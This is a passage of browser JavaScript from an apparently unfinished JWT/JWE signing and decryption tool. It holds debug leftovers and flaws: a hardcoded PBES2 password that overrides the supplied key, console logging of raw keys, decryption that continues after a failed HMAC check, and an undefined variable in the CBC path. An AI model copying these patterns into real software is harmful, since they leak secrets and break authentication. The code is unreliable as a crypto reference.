        return b64URLencode(String.fromCharCode(...new Uint8Array(signature)));
    }
    catch (e) {
        jwt_error_message("Private Key: " + e);
    }
    return null;
}

/**
 * Signs a JWT using the specified algorithm (PSxxx) and private key.
 *
 * @param {string} header base64URL: The JWT header to be signed.
 * @param {string} body base64URL: The JWT body to be signed.
 * @param {string} alg The algorithm used for signing (e.g., PS256, PS384, PS512).
 * @param {string} [key=undefined] private key (RSA-PSS) used for signing (pkcs8 or JWK). If not provided, it will be generated.
 * @return {Promise<string|null>} The signature as Base64URL string, or null if signing fails.
 */
async function signPS(header, body, alg, key = undefined) {
    // const _alg_converter = {"PS256":"SHA-256","PS384":"SHA-384","PS512":"SHA-512"};
    if (!(isBase64Url(header) || isBase64Url(body))) {
        console.error("signPS: invalid header or body");
        return null;
    }
    if (key && typeof key !== "string") {
        console.error("signPS: key is not a string");
        return null;
    }
    // Check if the key is provided via function parameter
    if (!key) {
        // Check if the key is provided via input field if not generate a new keypair
        if (!(document.getElementById("privateKey").value)) {
            const keypair = await generatePSKey();
            document.getElementById('privateKey').value = keypair[0];
            document.getElementById('publicKey').value = keypair[1];
            key = keypair[0];
        }
        else {
            key = document.getElementById("privateKey").value;
        }
    }

    const encoder = new TextEncoder();
    try { // import key
        // if key is PEM format, import as pkcs8, else import as JWK
        const privateKey = await crypto.subtle.importKey(
            key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
            decodeKey(key, isPublicKey = false),
            { name: "RSA-PSS", hash: _alg_converter[alg] },
            true,
            ["sign"]
        );
        // sign the token
        var signature = await crypto.subtle.sign(
            {
                name: "RSA-PSS",
                saltLength: _alg_converter[alg].split("-")[1] / 8 //PS256 -> 32 bit, 384 -> 48, 512 -> 64
            },
            privateKey,
            encoder.encode(header + "." + body));
        return b64URLencode(String.fromCharCode(...new Uint8Array(signature)));

    }
    catch (e) {
        jwt_error_message("Private Key: " + e);
    }
    return null;
}

/**
 * Signs a JWT with HMAC using the specified algorithm and key
 *
 * @param {string} header Base64 URL encoded header
 * @param {string} body Base64 URL encoded body
 * @param {string} alg Algorithm to use (e.g., HS256, HS384, HS512)
 * @param {string} [key=undefined] Ascii string or Base64 encoded key to use for signing. If not provided, a new key will be generated.
 * @param {boolean} [keyIsBase64=false] Indicates if the key is Base64 encoded. Default is false.
 * @return {Promise<string|null>} Base64 URL encoded signature or null if an error occurs
 */
async function signHS(header, body, alg, key = undefined, keyIsBase64 = false) {
    if (!(isBase64Url(header) || isBase64Url(body))) {
        console.error("signHS: invalid header or body");
        return null;
    }
    if (key && typeof key !== "string") {
        console.error("signHS: key is not a string");
        return null;
    }
    if (alg !== "HS256" && alg != "HS384" && alg != "HS512") {
        console.error("signHS: invalid alg", alg);
        return null;
    }
    const enc = new TextEncoder();
    if (!key) { // generate a new key if not provided
        if (!(document.getElementById("key").value)) {
            key = generateHMACKey(32);
            document.getElementById("key").value = key;
        }
        else {
            key = document.getElementById("key").value;
        }
    }
    try { // import the key and sign the token
        const hmac_key = await crypto.subtle.importKey(
            "raw",
            keyIsBase64 ? base64urlToUint8Array(base64_to_URL(key)) : enc.encode(key),
            { name: "HMAC", hash: _alg_converter[alg] },
            false,
            ["sign"]
        );

        var signature = await crypto.subtle.sign("HMAC", hmac_key, enc.encode(header + "." + body));
    }
    catch (e) {
        jwt_error_message("Key: " + e);
    }
    return b64URLencode(String.fromCharCode(...new Uint8Array(signature)));
}

// #endregion ====================== End of JWT Functions

// #region ====================== JWE Functions
/**
 * Decrypts the CEK (Content Encryption Key) using the given key and algorithm.
 *
 * @param {string} encrypted_cek - Base64URL: The encrypted CEK to be decrypted.
 * @param {string} key - private key in PEM or JWK format (asym) or BASE64 (sym)
 * @param {string} alg - The algorithm used to decrypt CEK (e.g., RSA-OAEP, A128KW, etc.)
 * @param {string} encryption_alg - The algorithm used for encryption (e.g., A128CBC-HS256, A256GCM, etc.)
 * @param {object} header - The JWT header containing the IV, tag, salt, iterationAmount for decryption.
 * @return {Promise<Uint8Array>} - The decrypted CEK as a Uint8Array.
 * @throws {Error} - Throws an error if the algorithm is not supported or if the decryption fails.
 */
async function decrypt_cek(encrypted_cek, key, alg, encryption_alg, header) {
    console.debug('decrypt cek')
    console.debug(URL_to_base64(encrypted_cek))
    const enc = new TextEncoder()

    if (alg === "RSA-OAEP-256") {
        // Import key
        try {
            var privateKey = await crypto.subtle.importKey(
                key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
                decodeKey(key, isPublicKey = false),
                {
                    name: "RSA-OAEP",
                    hash: "SHA-256",
                },
                true,
                ['decrypt']
            );
        } catch (error) {
            console.error("Key Import Failed:", error)
        }
        // Decrypt CEK
        try {
            var cek = await crypto.subtle.decrypt(
                {
                    name: "RSA-OAEP",
                    hash: "SHA-256",
                },
                privateKey,
                base64urlToUint8Array(encrypted_cek)
            )
        } catch (error) {
            console.error("Decryption Failed:", error)
        }
        return new Uint8Array(cek)
    }
    else if (alg === "RSA-OAEP") {
        // Import key
        try {
            var privateKey = await crypto.subtle.importKey(
                key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
                decodeKey(key, isPublicKey = false),
                {
                    name: "RSA-OAEP",
                    hash: "SHA-1",
                },
                true,
                ['decrypt']
            );
        } catch (error) {
            console.error("Key Import failed:", error)
        }
        // decrypt CEK
        try {
            var cek = await crypto.subtle.decrypt(
                {
                    name: "RSA-OAEP",
                    hash: "SHA-1",
                },
                privateKey,
                base64urlToUint8Array(encrypted_cek)
            )
        } catch (error) {
            console.error("Decryption Failed:", error)
        }
        return new Uint8Array(cek)
    }
    else if (alg === "A128KW" || alg === "A192KW" || alg === "A256KW") {
        console.debug("alg: ", _alg_converter[encryption_alg])
        console.debug("length", encryption_alg.slice(1, 4))
        console.debug("enc_cek_buffer:", base64urlToUint8Array(encrypted_cek))
        // import key
        var kek = await crypto.subtle.importKey(
            "raw",
            base64ToUint8Array(key),
            {
                name: "AES-KW"
            },
            true,
            ["unwrapKey"]
        )
        if (["A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"].includes(encryption_alg)) {
            // kinda cheesy but since jwe concatenates cek and hmac_key
            // it cant be unwrapped as single key but only as hmac key since those can be of arbitrary length
            var cek = await crypto.subtle.unwrapKey(
                "raw",
                base64urlToUint8Array(encrypted_cek),
                kek,
                {
                    name: "AES-KW"
                },
                { name: "HMAC", hash: _alg_converter[encryption_alg.split('-')[1]] },
                true,
                ["verify"]
            )
        }
        else { // GCM 128, 192, 256
            var cek = await crypto.subtle.unwrapKey(
                "raw",
                base64urlToUint8Array(encrypted_cek),
                kek,
                {
                    name: "AES-KW"
                },
                {
                    name: _alg_converter[encryption_alg],
                    length: encryption_alg.slice(1, 4)
                },
                true,
                ["decrypt"]
            )
        }
        console.debug("cek Buffer", new Uint8Array(await crypto.subtle.exportKey("raw", cek)))
        return new Uint8Array(await crypto.subtle.exportKey("raw", cek))
    }
    else if (alg === "A128GCMKW" || alg === "A192GCMKW" || alg === "A256GCMKW") {
        var kek = await crypto.subtle.importKey(
            "raw",
            base64ToUint8Array(key),
            {
                name: "AES-GCM"
            },
            true,
            ["unwrapKey", "decrypt"]
        )
        if (["A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"].includes(encryption_alg)) {
            // kinda cheesy but since jwe concatenates cek and hmac_key
            // it cant be unwrapped as single key but only as hmac key since those can be of arbitrary length
            // even more cheese this time
            var cek = crypto.subtle.decrypt(
                {
                    name: "AES-GCM",
                    iv: base64urlToUint8Array(header.iv),
                    tagLength: 128
                },
                kek,
                new Uint8Array([
                    ...base64urlToUint8Array(encrypted_cek),
                    ...base64urlToUint8Array(header.tag)
                ])
            );
            return cek;
        }
        else { // GCM 128, 192, 256
            var cek = await crypto.subtle.unwrapKey(
                "raw",
                new Uint8Array([...base64urlToUint8Array(encrypted_cek), ...base64urlToUint8Array(header.tag)]),
                kek,
                {
                    name: "AES-GCM",
                    iv: base64urlToUint8Array(header.iv),
                    tagLength: 128
                },
                {
                    name: _alg_converter[encryption_alg],
                    length: encryption_alg.slice(1, 4)
                },
                true,
                ["decrypt"]
            )
        }
        return new Uint8Array(await crypto.subtle.exportKey("raw", cek))
    }
    else if (alg === "PBES2-HS256+A128KW" || alg === "PBES2-HS384+A192KW" || alg === "PBES2-HS512+A256KW") {
        // PBES2 with HMAC and AES Key Wrap
        key = btoa("Possibly-Instructive-Puzzle")
        const passwordBuffer = await crypto.subtle.importKey(
            "raw",
            base64ToUint8Array(key),
            { name: "PBKDF2" },
            false,
            ["deriveKey"]
        );
        console.debug("=== PBES2 DEBUG ===");
        console.debug("key (raw):", key);
        console.debug("key.length:", key.length);
        console.debug("base64ToUint8Array(key):", base64ToUint8Array(key));
        console.debug("===================");
        console.debug("salt raw:", header.p2s)
        console.debug("salt decoded:", base64urlToUint8Array(header.p2s))
        console.debug("iterations:", header.p2c)
        console.debug("hash:", _alg_converter[alg])
        console.debug("length:", encryption_alg.slice(1, 4))
        const kek = await crypto.subtle.deriveKey(
            {
                name: "PBKDF2",
                salt: base64urlToUint8Array(header.p2s),
                iterations: header.p2c,
                hash: _alg_converter[alg] // PBES2-HS256+A128KW -> SHA-256, PBES2-HS384+A192KW -> SHA-384, PBES2-HS512+A256KW -> SHA-512
            },
            passwordBuffer,
            {
                name: "AES-KW",
                length: parseInt(alg.split('+A')[1].split('KW')[0]) // A128KW -> 128, A192KW -> 192, A256KW -> 256
            },
            true,
            ["unwrapKey"]
        )
        console.debug("=== PARAMETER VERGLEICH ===");
        console.debug("KEK algorithm:", kek.algorithm);
        console.debug("KEK usages:", kek.usages);
        console.debug("encrypted_cek length:", base64urlToUint8Array(encrypted_cek).length);
        console.debug("Expected CEK length für A128CBC-HS256:", 32); // 16 HMAC + 16 AES
        console.debug("key (raw):", key);
        console.debug("derived kek:b64url", Uint8ArrayTobase64Url(await crypto.subtle.exportKey("raw", kek)))
        console.debug("encrypted_cek:", encrypted_cek);
        console.debug("encrypted_cek bytes:", base64urlToUint8Array(encrypted_cek))

        // DEBUGGING: Teste mit bekanntem funktionierenden KEK
        console.debug("=== KEK TEST ===");
        try {
            // Erstelle einen Test-KEK mit den gleichen Bytes wie dein PBES2-KEK
            const testKek = await crypto.subtle.importKey(
                "raw",
                await crypto.subtle.exportKey("raw", kek), // Verwende dein PBES2-KEK
                { name: "AES-KW" },
                true,
                ["unwrapKey"]
            );

            console.debug("Test KEK erstellt:", testKek);
            console.debug("Test KEK algorithm:", testKek.algorithm);
            console.debug("Test KEK usages:", testKek.usages);

            // Teste unwrapKey mit dem re-importierten KEK
            const testCek = await crypto.subtle.unwrapKey(
                "raw",
                base64urlToUint8Array(encrypted_cek),
                testKek,
                { name: "AES-KW" },
                { name: "HMAC", hash: "SHA-256" }, // Verwende SHA-256 statt der automatischen Erkennung
                true,
                ["verify"]
            );

            console.debug("✅ Test unwrapKey ERFOLGREICH!", testCek);
            console.debug("Test CEK bytes:", new Uint8Array(await crypto.subtle.exportKey("raw", testCek)));

        } catch (testError) {
            console.debug("❌ Test unwrapKey FEHLGESCHLAGEN:", testError);
        }
        console.debug("=== ENDE KEK TEST ===");
        // DEBUGGING: Teste PBKDF2-Ableitung separat
        console.debug("=== PBKDF2 TEST ===");
        try {
            // Teste verschiedene Passwort-Eingaben
            const testPasswords = [
                new TextEncoder().encode("Possibly-Instructive-Puzzle"), // UTF-8
                base64ToUint8Array(key), // Dein aktueller Ansatz
                new TextEncoder().encode(atob(key)) // Base64 dekodiert zu UTF-8
            ];

            for (let i = 0; i < testPasswords.length; i++) {
                console.debug(`--- Test Passwort ${i + 1} ---`);
                console.debug("Password bytes:", testPasswords[i]);

                try {
                    const testPasswordBuffer = await crypto.subtle.importKey(
                        "raw",
                        testPasswords[i],
                        { name: "PBKDF2" },
                        false,
                        ["deriveKey"]
                    );

                    const testKek = await crypto.subtle.deriveKey(
                        {
                            name: "PBKDF2",
                            salt: base64urlToUint8Array(header.p2s),
                            iterations: header.p2c,
                            hash: "SHA-256"
                        },
                        testPasswordBuffer,
                        {
                            name: "AES-KW",
                            length: 128
                        },
                        true,
                        ["unwrapKey"]
                    );

                    const testKekBytes = await crypto.subtle.exportKey("raw", testKek);
                    console.debug(`Test KEK ${i + 1} bytes:`, new Uint8Array(testKekBytes));

                    // Vergleiche mit deinem originalen KEK
                    const originalKekBytes = await crypto.subtle.exportKey("raw", kek);
                    const areEqual = new Uint8Array(testKekBytes).every((val, idx) =>
                        val === new Uint8Array(originalKekBytes)[idx]
                    );
                    console.debug(`KEK ${i + 1} gleich original:`, areEqual);

                } catch (testErr) {
                    console.debug(`Test Passwort ${i + 1} FEHLER:`, testErr);
                }
            }
        } catch (pbkdf2Error) {
            console.debug("❌ PBKDF2 Test FEHLER:", pbkdf2Error);
        }
        console.debug("=== ENDE PBKDF2 TEST ===");
        // DEBUGGING: Teste verschiedene HMAC-Hashes
        console.debug("=== HMAC HASH TEST ===");
        const hashesToTest = ["SHA-256", "SHA-384", "SHA-512"];

        for (const testHash of hashesToTest) {
            try {
                console.debug(`--- Teste HMAC mit ${testHash} ---`);
                const testCek = await crypto.subtle.unwrapKey(
                    "raw",
                    base64urlToUint8Array(encrypted_cek),
                    kek,
                    { name: "AES-KW" },
                    { name: "HMAC", hash: testHash },
                    true,
                    ["verify"]
                );

                console.debug(`✅ ${testHash} ERFOLGREICH!`, testCek);
                console.debug(`${testHash} CEK:`, new Uint8Array(await crypto.subtle.exportKey("raw", testCek)));
                break; // Wenn erfolgreich, breche ab

            } catch (hashError) {
                console.debug(`❌ ${testHash} FEHLGESCHLAGEN:`, hashError);
            }
        }
        console.debug("=== ENDE HMAC HASH TEST ===");
        if (["A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"].includes(encryption_alg)) {
            // kinda cheesy but since jwe concatenates cek and hmac_key
            // it cant be unwrapped as single key but only as hmac key since those can be of arbitrary length
            // ORIGINAL unwrapKey mit erweiterten Debug-Infos
            console.debug("=== FINALER UNWRAP TEST ===");
            console.debug("Verwende:");
            console.debug("- encrypted_cek:", base64urlToUint8Array(encrypted_cek));
            console.debug("- kek:", kek);
            console.debug("- hash:", _alg_converter[encryption_alg.split('-')[1]]);

            try {
                var cek = await crypto.subtle.unwrapKey(
                    "raw",
                    base64urlToUint8Array(encrypted_cek),
                    kek,
                    { name: "AES-KW" },
                    { name: "HMAC", hash: _alg_converter[encryption_alg.split('-')[1]] },
                    true,
                    ["verify"]
                );

                console.debug("✅ FINALER UNWRAP ERFOLGREICH!");
                console.debug("Final CEK:", new Uint8Array(await crypto.subtle.exportKey("raw", cek)));

            } catch (finalError) {
                console.debug("❌ FINALER UNWRAP FEHLGESCHLAGEN:", finalError);
                console.debug("Error name:", finalError.name);
                console.debug("Error message:", finalError.message);
            }
            console.debug("=== ENDE FINALER UNWRAP TEST ===");
            console.debug("enc_cek: b64url", encrypted_cek)
            console.debug("kek:", kek)
            console.debug("alg:", _alg_converter[encryption_alg])
            console.debug("hash:", _alg_converter[encryption_alg.split('-')[1]])
            var cek = await crypto.subtle.unwrapKey(
                "raw",
                base64urlToUint8Array(encrypted_cek),
                kek,
                {
                    name: "AES-KW"
                },
                { name: "HMAC", hash: _alg_converter[encryption_alg.split('-')[1]] },
                true,
                ["verify"]
            )

        }
        else { // GCM 128, 192, 256
            var cek = await crypto.subtle.unwrapKey(
                "raw",
                base64urlToUint8Array(encrypted_cek),
                kek,
                {
                    name: "AES-KW"
                },
                {
                    name: _alg_converter[encryption_alg],
                    length: encryption_alg.slice(1, 4)
                },
                true,
                ["decrypt"]
            )
        }
        return new Uint8Array(await crypto.subtle.exportKey("raw", cek))
    }
    else if (alg === "ECDH-ES") {
        console.error("ECDH-ES not implemented yet")
        /*
        ECDH-ES: Elliptic Curve Diffie-Hellman Ephemeral Static
        Funktioniert aktuell nicht. Ich weiß nicht was der standard Salt wert ist.
        const encToHash = {
            "A128CBC-HS256": "SHA-256",
            "A192CBC-HS384": "SHA-384",
            "A256CBC-HS512": "SHA-512",
            "A128GCM": "SHA-256",
            "A192GCM": "SHA-384",
            "A256GCM": "SHA-512",
        };

        console.debug("alg:", _alg_converter[encryption_alg]);

        // Verwende ein leeres Array als Standardwert für salt, wenn es nicht im Header vorhanden ist
        const salt = header.salt ? base64urlToUint8Array(header.salt) : new Uint8Array(0);
        console.log("salt:", salt);

        // Importiere den ephemeral public key
        const ephemeralPublicKey = await crypto.subtle.importKey(
            "jwk",
            header.epk,
            {
                name: "ECDH",
                namedCurve: header.epk.crv
            },
            false,  // extractable: false
            []
        );

        // Importiere den privaten Schlüssel
        const privateKey = await crypto.subtle.importKey(
            key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
            decodeKey(key,isPublicKey=false),
            {
                name: "ECDH",
                namedCurve: header.epk.crv
            },
            false,  // extractable: false
            ["deriveKey"]
        );

        // Berechne die richtige Schlüssellänge für den Algorithmus
        let keyLength;
        if (encryption_alg.includes("CBC-HS")) {
            const bits = parseInt(encryption_alg.match(/(\d{3})/)[0]);
            keyLength = bits * 2;  // Doppelte Länge für CBC-HMAC
        } else {
            keyLength = parseInt(encryption_alg.match(/(\d{3})/)[0]);
        }

        // Bestimme den Namen des Algorithmus für die Web Crypto API
        const alg_name = encryption_alg.includes("GCM") ? "AES-GCM" : "AES-CBC";

        try {
            // Leite den Schlüssel zweistufig ab
            // Schritt 1: Gemeinsames Geheimnis aus ECDH ableiten
            const derivedKey = await crypto.subtle.deriveKey(
                {
                    name: "ECDH",
                    public: ephemeralPublicKey
                },
                privateKey,
                {
                    name: "HKDF",
                    hash: encToHash[encryption_alg],
                    salt: salt,
                    info: new TextEncoder().encode("Content Encryption Key")
                },
                false,
                ["deriveKey"]
            );

            // Schritt 2: Verwende HKDF, um den finalen CEK abzuleiten
            const cek = await crypto.subtle.deriveKey(
                {
                    name: "HKDF",
                    hash: encToHash[encryption_alg],
                    salt: salt,
                    info: new TextEncoder().encode("Content Encryption Key")
                },
                derivedKey,
                {
                    name: alg_name,
                    length: keyLength
                },
                true,  // Extrahierbar machen, um den Rohschlüssel zu erhalten
                ["decrypt"]
            );

            return new Uint8Array(await crypto.subtle.exportKey("raw", cek));
        } catch (error) {
            console.error("Fehler bei der Schlüsselableitung:", error);
            throw error;
        }
        */
    }
    else if (alg === "dir") { // direct encryption
        return base64ToUint8Array(key); // key is the CEK
    }
    else {
        throw new Error(alg + "Algorithm not supported")
    }

}

/**
 * This function handles the decryption of a JWE token.
 * It takes the JWE from "tokenJWE" input field, decrypts it using the provided key and algorithm
 *
 * @return {Promise<boolean>} - Returns true if the decryption was successful, false otherwise.
 * @description This function is called when the user clicks the "Decrypt" button in the UI.
 */
async function decrypt() {
    // <protected_header>.<encrypted_key>.<iv>.<ciphertext>.<authentication_tag>
    /** Read protected Header
     *  decrypt encrypted_key (cek)
     *  extract iv
     *  decrypt ciphertext
     *  Check Authentication Tag
     */
    document.getElementById("jweErrorMessage").innerText = "";

    const encrypted_token = document.getElementById("tokenJWE").value;
    if (!(isValidJWE(encrypted_token))) {
        document.getElementById("errorMessageEncodedJWE").value = "Bad Token";
        return false;
    }
    // Read/Parse Token
    const split_token = encrypted_token.split(".");
    const protected_header = JSON.parse(b64URLdecode(split_token[0]))
    const encrypted_cek = split_token[1]
    const iv = split_token[2]
    const ciphertext = split_token[3]
    const authentication_tag = split_token[4]

    // Set UI elements
    document.getElementById("algorithmJWE").value = protected_header.alg;
    document.getElementById("encryptionAlgorithmJWE").value = protected_header.enc;
    document.getElementById("decodedHeaderJWE").value = JSON.stringify(protected_header, undefined, 4)

    // Read Key
    let key = document.getElementById("keyJWE").value
    key = document.getElementById("isSymmetricKeyJWEBase64").checked ? key : btoa(key);
    // Symmetric Key (dir, Axxx)
    if (protected_header.alg[0] === "A" || protected_header.alg === "dir") { //TODO ist "dir" hier richtig?
        document.getElementById("symKeysJWE").style.display = "block";
        document.getElementById("asymKeysJWE").style.display = "none";
        document.getElementById("pbkdf2-parametersJWE").style.display = "none";

    }
    else if (protected_header.alg === "PBES2-HS256+A128KW" || protected_header.alg === "PBES2-HS384+A192KW" || protected_header.alg === "PBES2-HS512+A256KW") {
        document.getElementById("symKeysJWE").style.display = "block";
        document.getElementById("asymKeysJWE").style.display = "none";
        document.getElementById("pbkdf2-parametersJWE").style.display = "block";
        document.getElementById("saltJWE").value = URL_to_base64(protected_header.p2s)
        document.getElementById("pbkdf2IterationsJWE").value = protected_header.p2c

    }
    // Asymmetric Key (RSA, ECDH-ES)
    else {
        document.getElementById("symKeysJWE").style.display = "none";
        document.getElementById("asymKeysJWE").style.display = "block";
        document.getElementById("pbkdf2-parametersJWE").style.display = "none";
        key = document.getElementById("privateKeyJWE").value
    }
    if (!key) {
        jwe_error_message("Key is required for decryption")
        return false;
    }
    // Decrypt encrypted_cek

    const cek = await decrypt_cek(encrypted_cek, key, protected_header.alg, protected_header.enc, protected_header);
    console.debug("decrypted cek:", cek)
    //document.getElementById("cek").value = URL_to_base64(Uint8ArrayTobase64Url(cek));

    // decrypt ciphertext
    const body = await decrypt_ciphertext(ciphertext, cek, iv, protected_header.enc, split_token[0], authentication_tag)
    try { // TODO Better way of dealing with invalid JSON
        document.getElementById("decodedBodyJWE").value = JSON.stringify(JSON.parse(body), undefined, 4);
    } catch (error) {
        document.getElementById("decodedBodyJWE").value = body;
    }
    console.info("Decryption successful:", body)
    return true
}

/**
 * Calculates the length of the Additional Authenticated Data (AAD) in bits.
 * This is used in the context of AES encryption.
 *
 * @param {Uint8Array} aad - Uint8Array: Ascii Additional Authenticated Data (AAD)
 * @return {Uint8Array} - 8 Byte Array: Length of AAD in Bits
 */
function getAL(aad) {
    const aadLengthInBits = aad.length * 8;

    const alBuffer = new ArrayBuffer(8);
    const alView = new DataView(alBuffer);

    // set as big endian
    alView.setUint32(4, aadLengthInBits);  // lower 32 Bit
    alView.setUint32(0, Math.floor(aadLengthInBits / 2 ** 32));  // upper 32 Bit

    return new Uint8Array(alBuffer);
}
/**
 * Verifies the ciphertext using HMAC authentication tag.
 *
 * @param {string} additionalData - Ascii: contains the protected header
 * @param {string} iv - Base64Url
 * @param {string} ciphertext - Base64Url
 * @param {Uint8Array} hmac_key
 * @param {string} auth_tag - Base64Url
 * @param {string} alg - Algorithm used for HMAC (A128CBC-HS256, A192CBC-HS384, A256CBC-HS512)
 * @returns {Promise<boolean>} - true if the verification is successful, false otherwise
 */
async function verify_jwe_cbc(additionalData, iv, ciphertext, hmac_key, alg, auth_tag) {
    // AAD || IV || Ciphertext || AL
    const enc = new TextEncoder()
    try {  // import key
        console.debug("hash_alg", _alg_converter[alg.split('-')[1]])
        var key = await crypto.subtle.importKey(
            "raw",
            hmac_key,
            {
                name: "HMAC",
                hash: _alg_converter[alg.split('-')[1]]
            },
            true,
            ["sign"]
        )
    }
    catch (error) {
        console.error(`Key import for hmac ${alg} failed: ${error}`)
        return false
    }
    try { // sign the data and manually verify the tag
        // HMAC = HMAC(AAD || IV || Ciphertext || AL)
        var signature = await crypto.subtle.sign(
            'HMAC',
            key,
            new Uint8Array([...enc.encode(additionalData), ...base64urlToUint8Array(iv), ...base64urlToUint8Array(ciphertext), ...getAL(enc.encode(additionalData))])
        )
    }
    catch (error) {
        console.error(`Signature failed: CBC Auth Tag Verification:  ${error}`)
        return false
    }
    // verify the tag
    const areEqual = (a, b) =>
        a.length === b.length && a.every((val, i) => val === b[i]);
    if (areEqual(new Uint8Array(signature.slice(0, hmac_key.length)), base64urlToUint8Array(auth_tag))) {
        console.info("JWE is verified")
        return true;
    }
    else {
        console.error(`JWE is NOT verified\nVerification Failed: HMAC ${alg}:`)
        return false;
    }
}

/**
 * Decrypts the ciphertext using the given CEK (Content Encryption Key) and algorithm.
 *
 * @param {string} ciphertext - Base64URL: The ciphertext to be decrypted.
 * @param {Uint8Array} cek - The CEK used for decryption.
 * @param {string} iv - Base64URL: The initialization vector used for decryption.
 * @param {string} alg - The algorithm used for decryption (e.g., A128GCM, A256CBC-HS512, etc.).
 * @param {string} additionalData - Base64URL: The additional authenticated data (AAD) used for decryption.
 * @param {string} auth_tag - Base64URL: The authentication tag used for decryption.
 * @return {Promise<string|null>} - The decrypted plaintext as a string, or null if decryption fails.
 * @throws {Error} - Throws an error if the algorithm is not supported.
 */
async function decrypt_ciphertext(ciphertext, cek, iv, alg, additionalData, auth_tag) {
    const enc = new TextEncoder()
    // -----------------------GCM-----------------------
    if (alg.match(/^A\d{3}GCM$/)) { // unnecessary complicated for: A128GCM, A192GCM, A256GCM
        try {  // key import
            var key = await crypto.subtle.importKey(
                "raw",
                cek,
                {
                    name: "AES-GCM"
                },
                false,
                ["decrypt"]
            );
        } catch (error) {
            console.error("Key Import Failed:", error)
        }
        try { // decrypt ciphertext
            // AES-GCM: Ciphertext || auth_tag
            var decrypted = await crypto.subtle.decrypt(
                {
                    name: "AES-GCM",
                    additionalData: enc.encode(additionalData),
                    iv: base64urlToUint8Array(iv),
                    tagLength: 128 // AES-GCM uses a 128-bit tag
                },
                key,
                new Uint8Array([...base64urlToUint8Array(ciphertext), ...base64urlToUint8Array(auth_tag)])
            );
        } catch (error) {
            console.error("Decryption Failed", error)
            return
        }
    }
    //-----------------------CBC-----------------------
    else if (alg === "A128CBC-HS256" || alg === "A192CBC-HS384" || alg === "A256CBC-HS512") {
        // Decryption and Verification are seperate
        // cek = hmac_key || enc_key
        // split cek
        const full_cek = new Uint8Array(cek)
        console.debug("full_cek:", full_cek.length)
        if (!([32, 48, 64].includes(full_cek.length))) {
            throw new Error(`${alg}: bad full_keylength. Got: ${full_cek.length}`)
        }
        const hmac_key = full_cek.slice(0, full_cek.length / 2)
        const enc_key = full_cek.slice(full_cek.length / 2)
        // verify the tag before decrypting the ciphertext
        // TODO would be usefull to do something when the token is not verified
        const is_JWE_signature_valid = await verify_jwe_cbc(additionalData, iv, ciphertext, hmac_key, alg, auth_tag)
        if (!is_JWE_verified_successfully) {
            jwt_error_message("JWE signature verification failed - decryption continued but might fail")
        }
        try { // key import
            var key = await crypto.subtle.importKey(
                "raw",
                enc_key,
                {
                    name: "AES-CBC"
                },
                false,
                ["decrypt"]
            );
        } catch (error) {
            console.error("Key Import Failed:", error)
        }
        try { // decrypt ciphertext
            var decrypted = await crypto.subtle.decrypt(
                {
                    name: "AES-CBC",
                    iv: base64urlToUint8Array(iv)
                },
                key,
                base64urlToUint8Array(ciphertext)
            );
        } catch (error) {
            console.error("Decryption Failed", error)
            return
        }
    }
    else {
        throw new Error(alg + "Encryption Algorithm not supported");

    }
    return new TextDecoder().decode(decrypted);

}

async function encrypt() {
    /**
     * ASCII(Encoded Protected Header || '.' ||
        BASE64URL(JWE AAD))
     * JWE Encryption
     * - BASE64URL(UTF8(JWE Protected Header))
     * - generate Content Encryption Key (CEK)
     * - Encrypt CEK with pubKey
     * - Base64Url(encrypted_CEK)
     * - Generate random JWE IV
     * - Base64URL(JWE_IV)
     * - AAD = ASCII(BASE64URL(UTF8(JWE Protected Header)))
     * - authenticated_encryption_CEK_IV(plaintext/body) mit AAD
     * - Base64URL(ciphertext)
     * - Base64URL(Authentication_Tag)
     *   =============COMPACT SERIALIZATION==============
     *   BASE64URL(UTF8(JWE Protected Header))  || '.' ||
     *   BASE64URL(JWE Encrypted Key)           || '.' ||
     *   BASE64URL(JWE Initialization Vector)   || '.' ||
     *   BASE64URL(JWE Ciphertext)              || '.' ||
         BASE64URL(JWE Authentication Tag)
     */

    // Get the values from the input fields
    // TODO: should also work for invalid JSON
    document.getElementById("errorMessageKeyJWE").innerText = "";

    try {
        var header = b64URLencode(JSON.stringify(JSON.parse(document.getElementById("decodedHeaderJWE").value)));
        document.getElementById("errorMessageHeaderJWE").innerText = "";
    }
    catch (e) {
        console.error(e);
        document.getElementById("errorMessageHeaderJWE").innerText = e;
        document.getElementById("tokenJWE").value = "";
        var header = b64URLencode(document.getElementById("decodedHeaderJWE").value);
    }
    try {
        var body = b64URLencode(JSON.stringify(JSON.parse(document.getElementById("decodedBodyJWE").value)));
        document.getElementById("errorMessageBodyJWE").innerText = "";
    }
    catch (e) {
        console.error(e);
        document.getElementById("errorMessageBodyJWE").innerText = e;
        document.getElementById("tokenJWE").value = "";
        var body = b64URLencode(document.getElementById("decodedBodyJWE").value);
    }
    const alg = document.getElementById("algorithmJWE").value;
    const encryption_algorithm = document.getElementById('encryptionAlgorithmJWE').value;

    // get cek or generate a new one if not set
    let cek = generateContentEncryptionKey(encryption_algorithm);
    console.debug("cek_length:", cek.length);

    // encrypt the cek
    if (alg === "RSA-OAEP" || alg === "RSA-OAEP-256") {
        var encrypted_cek = await encryptRSA_OAEP(cek, alg);

    }
    else if (alg === "dir") {
        const is_kek_base_64 = document.getElementById("isSymmetricKeyJWEBase64").checked;
        if (!(document.getElementById("keyJWE").value)) {
            document.getElementById("keyJWE").value = generateContentEncryptionKey(encryption_algorithm, is_kek_base_64);
        }
        const kek_input_b64 = is_kek_base_64 ? document.getElementById("keyJWE").value : URL_to_base64(b64URLencode(document.getElementById("keyJWE").value))
        cek = kek_input_b64
        var encrypted_cek = "";

    }
    else if (["A128KW", "A192KW", "A256KW", "A128GCMKW", "A192GCMKW", "A256GCMKW", "PBES2-HS256+A128KW", "PBES2-HS384+A192KW", "PBES2-HS512+A256KW"].includes(alg)) {
        // Symmetric Key Encryption
        // So the following is only key stuff is only needed once
        // Check if key is set, if not generate a new one
        const is_kek_base_64 = document.getElementById("isSymmetricKeyJWEBase64").checked;
        if (!(document.getElementById("keyJWE").value)) {
            document.getElementById("keyJWE").value = generateKeyEncryptionKey(alg, is_kek_base_64);
        }
        // If the key is not Base64 encoded, encode it
